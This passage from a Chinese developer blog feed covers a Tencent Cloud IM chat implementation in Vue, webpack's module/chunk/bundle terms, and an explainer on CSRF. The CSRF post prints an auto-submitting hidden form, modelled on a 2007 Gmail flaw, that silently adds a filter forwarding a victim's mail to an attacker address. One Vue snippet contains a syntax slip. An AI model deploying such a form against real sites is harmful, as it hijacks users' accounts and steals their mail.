&#123;</span><br><span class="line">           <span class="built_in">this</span>.$store.commit(<span class="string">&quot;pushCurrentMessageList&quot;</span>, message);</span><br><span class="line">         &#125;)</span><br><span class="line">         .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">         &#125;);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>利用自定义消息可以实现腾讯云文档中不包含的消息类型根据业务需求发送消息，比如实现智能客服自定义消息类型，远程消息类型等等。</p><h4 id="普通消息："><a href="#普通消息：" class="headerlink" title="普通消息："></a><strong>普通消息：</strong></h4><p>腾讯云接口文档有提供消息api,可以根据api进行消息的发送。</p><table><thead><tr><th align="left">API</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createTextMessage">createTextMessage</a></td><td align="left">创建文本消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createTextAtMessage">createTextAtMessage</a></td><td align="left">创建可以附带 @ 提醒功能的文本消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createImageMessage">createImageMessage</a></td><td align="left">创建图片消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createAudioMessage">createAudioMessage</a></td><td align="left">创建音频消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createVideoMessage">createVideoMessage</a></td><td align="left">创建视频消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createCustomMessage">createCustomMessage</a></td><td align="left">创建自定义消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createFaceMessage">createFaceMessage</a></td><td align="left">创建表情消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createFileMessage">createFileMessage</a></td><td align="left">创建文件消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createMergerMessage">createMergerMessage</a></td><td align="left">创建合并消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#downloadMergerMessage">downloadMergerMessage</a></td><td align="left">下载合并消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#sendMessage">sendMessage</a></td><td align="left">发送消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#revokeMessage">revokeMessage</a></td><td align="left">撤回消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#resendMessage">resendMessage</a></td><td align="left">重发消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#deleteMessage">deleteMessage</a></td><td align="left">删除消息。</td></tr></tbody></table><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><h4 id="获取消息列表。"><a href="#获取消息列表。" class="headerlink" title="获取消息列表。"></a>获取消息列表。</h4><p>分页拉取指定会话的消息列表的接口，当用户进入会话首次渲染消息列表或者用户“下拉查看更多消息”时，需调用该接口。</p><p>我这里做了点击’获取更多’获取历史消息，当前页面一次只加载20条消息，提升页面加载速度。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法放在了vuex里，页面需要获取更多历史消息，调用vuex里的异步方法获取数据</span></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取消息列表</span></span><br><span class="line"><span class="comment">    * 调用时机：打开某一会话时或下拉获取历史消息时</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> <span class="variable">context</span></span></span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param <span class="type">&#123;String&#125;</span> <span class="variable">conversationID</span></span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="title">getMessageList</span>(<span class="params">context, conversationID</span>)</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (context.state.isCompleted) &#123;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">const</span> &#123;</span><br><span class="line">       nextReqMessageID,</span><br><span class="line">       currentMessageList</span><br><span class="line">     &#125; = context.state</span><br><span class="line">     tim(store.state.basic.imInfo.sdkAppID).getMessageList(&#123;</span><br><span class="line">       conversationID,</span><br><span class="line">       nextReqMessageID,</span><br><span class="line">       count: <span class="number">15</span></span><br><span class="line">     &#125;).then(<span class="function"><span class="params">imReponse</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&quot;getMessageList&quot;</span>, imReponse);</span><br><span class="line">       <span class="comment">// 更新messageID，续拉时要用到</span></span><br><span class="line">       context.state.nextReqMessageID = imReponse.data.nextReqMessageID</span><br><span class="line">       context.state.isCompleted = imReponse.data.isCompleted</span><br><span class="line">       <span class="comment">// 更新当前消息列表，从头部插入</span></span><br><span class="line">       context.state.currentMessageList = [...imReponse.data.messageList, ...currentMessageList]</span><br><span class="line">       context.state.pageList = [...imReponse.data.messageList]</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><h4 id="获取会话列表。"><a href="#获取会话列表。" class="headerlink" title="获取会话列表。"></a>获取会话列表。</h4><p>获取会话列表的接口，该接口会尝试同步最新的100条会话，在同步完成后返回 SDK 内部维护的会话列表。 调用时机：需要刷新会话列表时</p><p>注意：会话保存时长跟会话最后一条消息保存时间一致，消息默认保存7天，即会话默认保存7天。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拉取会话列表</span></span><br><span class="line"><span class="keyword">let</span> promise = tim.getConversationList();</span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">imResponse</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> conversationList = imResponse.data.conversationList; <span class="comment">// 会话列表，用该列表覆盖原有的会话列表</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">imError</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.warn(<span class="string">&#x27;getConversationList error:&#x27;</span>, imError); <span class="comment">// 获取会话列表失败的相关信息</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="获取会话资料。"><a href="#获取会话资料。" class="headerlink" title="获取会话资料。"></a>获取会话资料。</h4><p>获取会话资料的接口，当点击会话列表中的某个会话时，调用该接口获取会话的详细信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = tim.getConversationProfile(conversationID);promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">imResponse</span>) </span>&#123;  <span class="comment">// 获取成功  console.log(imResponse.data.conversation); // 会话资料&#125;).catch(function(imError) &#123;  console.warn(&#x27;getConversationProfile error:&#x27;, imError); // 获取会话资料失败的相关信息&#125;);</span></span><br></pre></td></tr></table></figure><h3 id="界面消息类型"><a href="#界面消息类型" class="headerlink" title="界面消息类型"></a>界面消息类型</h3><p>消息框中可以实现表情、图片、视频、文档消息发送。</p><p><img src="https://img-blog.csdnimg.cn/46b2b15f2ecf4ddaa7475cea0dac34df.png" alt="在这里插入图片描述"> </p><p><img src="https://img-blog.csdnimg.cn/641e00c18d43411fa315ed93729c4038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在<code>message-item</code>中定义每一条消息的发送样式，包括头像是否显示、是否是系统消息等等。通过组件的方式，给每一种消息类型定义不同的样式。</p><p><img src="https://img-blog.csdnimg.cn/9504060c07a44a51b91f97ac06f6a886.png" alt="在这里插入图片描述"> </p><p><img src="https://img-blog.csdnimg.cn/37c7815a691045f2956e6ded65acb666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/fe9d4a9ec1e8490bb87e052aded2b439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">avatar</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.currentConversation.type === <span class="string">&quot;C2C&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.isMine) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sessionObj.guestAvatar;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sessionObj.serviceAvatar;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.currentConversation.type === <span class="string">&quot;GROUP&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.isMine</span><br><span class="line">        ? <span class="built_in">this</span>.currentUserProfile.avatar</span><br><span class="line">        : <span class="built_in">this</span>.message.avatar;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">currentConversationType</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.currentConversation.type;</span><br><span class="line">  &#125;,<span class="comment">//头像</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">isMine</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(this.message.from,this.imInfo.userID,this.message.from == this.imInfo.userID)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.message.from == <span class="built_in">this</span>.sessionObj.guestImAccount;</span><br><span class="line">  &#125;,<span class="comment">//是否是自己发的消息</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">messagePosition</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      [<span class="string">&quot;TIMGroupTipElem&quot;</span>, <span class="string">&quot;TIMGroupSystemNoticeElem&quot;</span>].includes(</span><br><span class="line">        <span class="built_in">this</span>.message.type</span><br><span class="line">      )</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-center&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.message.type == <span class="string">&quot;TIMCustomElem&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;prompts&quot;</span> ||</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;transfer&quot;</span> ||</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;reception&quot;</span> ||</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;stopsession&quot;</span> ||</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;position-center&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.message.isRevoked) &#123;</span><br><span class="line">      <span class="comment">// 撤回消息</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-center&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isMine) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-right&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-left&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,    <span class="comment">//消息位置</span></span><br></pre></td></tr></table></figure><h3 id="智能客服会话"><a href="#智能客服会话" class="headerlink" title="智能客服会话"></a>智能客服会话</h3><p>在<code>message-item</code>中定义定义自定义消息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 智能客服自定义热度问题 --&gt;</span><br><span class="line">&lt;custom-heatquestion</span><br><span class="line">  v-<span class="keyword">else</span>-<span class="keyword">if</span>=<span class="string">&quot;message.subMsgType === &#x27;heatquestion&#x27;&quot;</span></span><br><span class="line">  :isMine=<span class="string">&quot;isMine&quot;</span></span><br><span class="line">  :payload=<span class="string">&quot;message.msgContent&quot;</span></span><br><span class="line">  :message=<span class="string">&quot;message&quot;</span></span><br><span class="line">/&gt;</span><br><span class="line">&lt;!-- 智能客服自定义相似问题 --&gt;</span><br><span class="line">&lt;custom-similarquestion</span><br><span class="line">  v-<span class="keyword">else</span>-<span class="keyword">if</span>=<span class="string">&quot;message.subMsgType === &#x27;similarquestion&#x27;&quot;</span></span><br><span class="line">  :isMine=<span class="string">&quot;isMine&quot;</span></span><br><span class="line">  :payload=<span class="string">&quot;message.msgContent&quot;</span></span><br><span class="line">  :message=<span class="string">&quot;message&quot;</span></span><br><span class="line">/&gt;</span><br><span class="line">&lt;!-- 智能客服自定义查看指定问题 --&gt;</span><br><span class="line">&lt;custom-specifiedquestion</span><br><span class="line">  v-<span class="keyword">else</span>-<span class="keyword">if</span>=<span class="string">&quot;message.subMsgType === &#x27;specifiedquestion&#x27;&quot;</span></span><br><span class="line">  :isMine=<span class="string">&quot;isMine&quot;</span></span><br><span class="line">  :payload=<span class="string">&quot;message.msgContent&quot;</span></span><br><span class="line">  :message=<span class="string">&quot;message&quot;</span></span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>界面上判断是否开启智能客服，通过维护知识库内容实现点击问题进行回答：</p><p><img src="https://img-blog.csdnimg.cn/75b09b5a991a43bea705315d8afedf29.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/021c2af7ae084281a07423fa7a549dfd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击<strong>转人工</strong>按钮可以接通人工客服。</p><h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><p>远程控制功能主要以客户端插件的方式实现客服控制访客桌面，进行远程控制。</p><p>这里采用了向日葵的远程插件，使用者需要先申请创建<code>APPID</code> 和<code> APP KEY</code>。</p><p>大致流程图：</p><p>远程控制主要是客服端向访客发起，访客可以选择接受或者拒绝，并且和实时系统消息进行关联，分为远程开始、进行中、结束以及访客拒绝。</p><p><img src="https://img-blog.csdnimg.cn/c5cd062ace4843f6a5593dc6a6bf29ff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/677770e93c0d46148455176133d0c6f5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/fc0d9a80cb0a440cad593258efbf39f3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/7846ceb741364702a89a5b6e35f9e4e1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>远程进行中会进行轮巡判断当前远程是否进行，否则关闭远程。</p><p>这里主要也是以自定义消息进行远程会话，然后调用客户端方法打开插件。源码中使用了<code>external.calld</code>的方法都是调用了后端的客户端方法，需要实现的小伙伴需要和后端进行沟通。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="IM聊天" scheme="http://aiolimp.com/categories/IM%E8%81%8A%E5%A4%A9/"/>
    
    
    <category term="IM聊天" scheme="http://aiolimp.com/tags/IM%E8%81%8A%E5%A4%A9/"/>
    
  </entry>
  
  <entry>
    <title>module、chunk和bundle</title>
    <link href="http://aiolimp.com/2021/08/12/module%E3%80%81chunk%E5%92%8Cbundle/"/>
    <id>http://aiolimp.com/2021/08/12/module%E3%80%81chunk%E5%92%8Cbundle/</id>
    <published>2021-08-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.212Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="module、chunk和bundle"><a href="#module、chunk和bundle" class="headerlink" title="module、chunk和bundle"></a>module、chunk和bundle</h1><h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3><p>先看看<code>webpack</code>官方对<code>module</code>的解读：</p><blockquote><p><code>Module</code>是离散功能块，相比于完整程序提供了更小的接触面。精心编写的模块提供了可靠的抽象和封装界限，使得应用程序中每个模块都具有条理清楚的设计和明确的目的。</p></blockquote><p>其实简单来说，<code>module</code>模块就是我们编写的代码文件，比如<code>JavaScript</code>文件、<code>CSS</code>文件、<code>Image</code>文件、<code>Font</code>文件等等，它们都是属于<code>module</code>模块。而<code>module</code>模块的一个特点，就是可以被引入使用。</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>同样的先看看官方解读：</p><blockquote><p>此 <code>webpack</code> 特定术语在内部用于管理捆绑过程。输出束（bundle）由块组成，其中有几种类型（例如 <code>entry</code> 和 <code>child</code> ）。通常，块直接与输出束 (<code>bundle</code>）相对应，但是，有些配置不会产生一对一的关系</p></blockquote><p>其实<code>chunk</code>是<code>webpack</code>打包过程的中间产物，<code>webpack</code>会根据文件的引入关系生成<code>chunk</code>，也就是说一个<code>chunk</code>是由一个<code>module</code>或多个<code>module</code>组成的，这取决于有没有引入其他的<code>module</code>。</p><h3 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h3><p>先看看官方解读：</p><blockquote><p><code>bundle</code> 由许多不同的模块生成，包含已经经过加载和编译过程的源文件的最终版本。</p></blockquote><p><code>bundle</code>其实是<code>webpack</code>的最终产物，通常来说，一个<code>bundle</code>对应这一个<code>chunk</code>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实<code>module</code>、<code>chunk</code>和<code>bundle</code>可以说是同一份代码在不同转换场景的不同名称：</p><ul><li>我们编写的是<code>module</code></li><li><code>webpack</code>处理时时<code>chunk</code></li><li>最终生成供使用的是<code>bundle</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="webpack" scheme="http://aiolimp.com/categories/webpack/"/>
    
    
    <category term="webpack" scheme="http://aiolimp.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>CSRF攻击</title>
    <link href="http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB/"/>
    <id>http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB/</id>
    <published>2021-08-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.215Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><h3 id="CSRF漏洞的发生"><a href="#CSRF漏洞的发生" class="headerlink" title="CSRF漏洞的发生"></a>CSRF漏洞的发生</h3><p>相比XSS，CSRF的名气似乎并不是那么大，很多人都认为CSRF“不那么有破坏性”。真的是这样吗？</p><p>接下来有请小明出场~~</p><h3 id="小明的悲惨遭遇"><a href="#小明的悲惨遭遇" class="headerlink" title="小明的悲惨遭遇"></a>小明的悲惨遭遇</h3><p>这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意：</p><blockquote><p>甩卖比特币，一个只要998！！</p></blockquote><p>聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生……</p><p>在这平静的外表之下，黑客的攻击已然得手。小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到<a href="mailto:&#x68;&#97;&#x63;&#107;&#101;&#x72;&#x40;&#x68;&#x61;&#x63;&#107;&#x65;&#x72;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#x68;&#97;&#x63;&#107;&#101;&#x72;&#x40;&#x68;&#x61;&#x63;&#107;&#x65;&#x72;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a>。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。</p><p>不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。</p><p>小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;https:&#x2F;&#x2F;mail.google.com&#x2F;mail&#x2F;h&#x2F;ewt1jmuj4ddv&#x2F;?v&#x3D;prf&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;cf2_emc&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;cf2_email&quot; value&#x3D;&quot;hacker@hakermail.com&quot;&#x2F;&gt; </span><br><span class="line">    .....</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;irf&quot; value&#x3D;&quot;on&quot;&#x2F;&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;nvp_bu_cftb&quot; value&#x3D;&quot;Create Filter&quot;&#x2F;&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">    document.forms[0].submit();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“<a href="mailto:&#104;&#97;&#x63;&#107;&#101;&#114;&#64;&#x68;&#x61;&#99;&#x6b;&#101;&#114;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#x6d;">&#104;&#97;&#x63;&#107;&#101;&#114;&#64;&#x68;&#x61;&#99;&#x6b;&#101;&#114;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#x6d;</a>”。</p><p>小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。</p><p>黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。</p></blockquote><p>小明很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了……</p><p>以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是2007年Gmail的CSRF漏洞：</p><p><a href="https://www.davidairey.com/google-gmail-security-hijack/">https://www.davidairey.com/google-Gmail-security-hijack/</a></p><p>当然，目前此漏洞已被Gmail修复，请使用Gmail的同学不要慌张。</p><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><p>一个典型的CSRF攻击有着如下的流程：</p><ul><li>受害者登录a.com，并保留了登录凭证（Cookie）。</li><li>攻击者引诱受害者访问了b.com。</li><li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</li><li>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li><li>a.com以受害者的名义执行了act=xx。</li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</li></ul><h3 id="几种常见的攻击类型"><a href="#几种常见的攻击类型" 